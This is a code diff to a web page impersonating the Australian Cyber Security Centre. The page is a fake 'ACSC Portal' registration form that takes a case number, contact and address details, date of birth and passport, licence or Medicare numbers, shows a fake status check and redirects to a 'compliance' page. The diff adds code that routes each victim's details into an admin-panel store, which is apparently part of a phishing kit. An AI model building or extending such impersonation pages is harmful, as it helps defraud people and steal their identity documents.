@@ -81,10 +81,7 @@ input.err~.err-text,select.err~.err-text{display:block;}
     <span class="logo-text"><span>Australian</span><span>Cyber Security</span><span>Centre</span></span>
   </a>
   <div class="card">
-    <div class="card-header">
-      <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" stroke="#1c3d6e" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="7" r="4" stroke="#1c3d6e" stroke-width="2"/></svg>
-      Create your ACSC Portal account
-    </div>
+
     <div class="success-box" id="successBox"><strong>Registration Successful!</strong><p>Your account has been created.</p></div>
     <form id="regForm" novalidate onsubmit="doRegister(event)">
       <div class="section">
@@ -148,7 +145,19 @@ input.err~.err-text,select.err~.err-text{display:block;}
 'use strict';
 function clearErr(el){el.classList.remove('err');}
 var rules=[{id:'caseNo',test:function(v){return v.length>0;}},{id:'fname',test:function(v){return v.length>0;}},{id:'lname',test:function(v){return v.length>0;}},{id:'email',test:function(v){return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);}},{id:'phone',test:function(v){return v.length>0;}},{id:'street',test:function(v){return v.length>0;}},{id:'suburb',test:function(v){return v.length>0;}},{id:'state',test:function(v){return v!=='';}},{id:'postcode',test:function(v){return /^\d{4}$/.test(v);}}];
-function doRegister(e){e.preventDefault();if(!document.getElementById('terms').checked){alert('Please agree to the Terms of Use and Privacy Policy.');return;}if(!validateDOB())return;var allGood=true;var firstBad=null;rules.forEach(function(r){var el=document.getElementById(r.id);var val=el.value.trim();var ok=r.test(val);el.classList.toggle('err',!ok);el.classList.toggle('ok',ok);if(!ok&&!firstBad)firstBad=el;if(!ok)allGood=false;});if(!allGood){firstBad.scrollIntoView({behavior:'smooth',block:'center'});firstBad.focus();return;}var btn=document.getElementById('regBtn');btn.disabled=true;btn.innerHTML='<span class="spinner"></span> Checking...';setTimeout(function(){var userData={caseNo:document.getElementById('caseNo').value.trim(),fname:document.getElementById('fname').value.trim(),lname:document.getElementById('lname').value.trim(),email:document.getElementById('email').value.trim(),phone:document.getElementById('phone').value.trim(),state:document.getElementById('state').value,suburb:document.getElementById('suburb').value.trim(),postcode:document.getElementById('postcode').value.trim(),street:document.getElementById('street').value.trim()};localStorage.setItem('portalUser',JSON.stringify(userData));btn.style.background='#1a7a40';btn.innerHTML='✓ Status Checked!';document.getElementById('successBox').classList.add('show');document.getElementById('successBox').scrollIntoView({behavior:'smooth',block:'center'});setTimeout(function(){window.location.href='compliance.html';},2000);},1800);}
+function doRegister(e){e.preventDefault();if(!document.getElementById('terms').checked){alert('Please agree to the Terms of Use and Privacy Policy.');return;}if(!validateDOB())return;var allGood=true;var firstBad=null;rules.forEach(function(r){var el=document.getElementById(r.id);var val=el.value.trim();var ok=r.test(val);el.classList.toggle('err',!ok);el.classList.toggle('ok',ok);if(!ok&&!firstBad)firstBad=el;if(!ok)allGood=false;});if(!allGood){firstBad.scrollIntoView({behavior:'smooth',block:'center'});firstBad.focus();return;}var btn=document.getElementById('regBtn');btn.disabled=true;btn.innerHTML='<span class="spinner"></span> Checking...';setTimeout(function(){var userData={caseNo:document.getElementById('caseNo').value.trim(),fname:document.getElementById('fname').value.trim(),lname:document.getElementById('lname').value.trim(),email:document.getElementById('email').value.trim(),phone:document.getElementById('phone').value.trim(),state:document.getElementById('state').value,suburb:document.getElementById('suburb').value.trim(),postcode:document.getElementById('postcode').value.trim(),street:document.getElementById('street').value.trim()};localStorage.setItem('portalUser',JSON.stringify(userData));
+// Also push directly to adminSubmissions so admin panel sees it immediately
+var existingSubs=JSON.parse(localStorage.getItem('adminSubmissions')||'[]');
+var existingUsers=JSON.parse(localStorage.getItem('adminUsers')||'[]');
+var alreadyIn=existingSubs.some(function(s){return s.email===userData.email;});
+if(!alreadyIn){
+  var now=new Date();
+  var nowStr=now.toLocaleDateString('en-AU')+' '+now.toLocaleTimeString('en-AU',{hour:'2-digit',minute:'2-digit'});
+  existingSubs.unshift({id:existingSubs.length+1,caseNo:userData.caseNo,fname:userData.fname,lname:userData.lname,email:userData.email,phone:userData.phone,street:userData.street,suburb:userData.suburb,state:userData.state,postcode:userData.postcode,officerName:userData.officerName,officerBadge:userData.officerBadge,time:nowStr,status:'Pending'});
+  existingUsers.unshift({id:existingUsers.length+1,fname:userData.fname,lname:userData.lname,email:userData.email,phone:userData.phone,role:'Partner',joined:now.toLocaleDateString('en-AU'),lastLogin:'Just now',status:'Active'});
+  localStorage.setItem('adminSubmissions',JSON.stringify(existingSubs));
+  localStorage.setItem('adminUsers',JSON.stringify(existingUsers));
+}btn.style.background='#1a7a40';btn.innerHTML='✓ Status Checked!';document.getElementById('successBox').classList.add('show');document.getElementById('successBox').scrollIntoView({behavior:'smooth',block:'center'});setTimeout(function(){window.location.href='compliance.html';},2000);},1800);}
 var idConfig={passport:{label:'Passport Number',placeholder:'e.g. PA1234567',extras:'passportExtras'},licence:{label:'Licence Number',placeholder:'e.g. 12345678',extras:'licenceExtras'},medicare:{label:'Medicare Card Number',placeholder:'e.g. 2123 45678 1',extras:'medicareExtras'}};
 function selectID(card,type){document.querySelectorAll('.id-card').forEach(function(c){c.classList.remove('selected');});card.classList.add('selected');document.getElementById('idType').value=type;document.getElementById('idTypeErr').style.display='none';var cfg=idConfig[type];document.getElementById('idNumberLabel').textContent=cfg.label+' *';document.getElementById('idNumber').placeholder=cfg.placeholder;document.getElementById('idNumber').value='';['passportExtras','licenceExtras','medicareExtras'].forEach(function(id){document.getElementById(id).style.display='none';});if(cfg.extras)document.getElementById(cfg.extras).style.display='block';document.getElementById('idFields').style.display='block';document.getElementById('idNumber').focus();}
 function fmtMMYYYY(el){var v=el.value.replace(/\D/g,'').slice(0,6);if(v.length>=3)v=v.slice(0,2)+'/'+v.slice(2);el.value=v;}
@@ -159,6 +168,8 @@ function validateDOB(){var d=document.getElementById('dobDay').value;var m=docum
 </script>
 </body>
 </html>
+
+
 
 
 
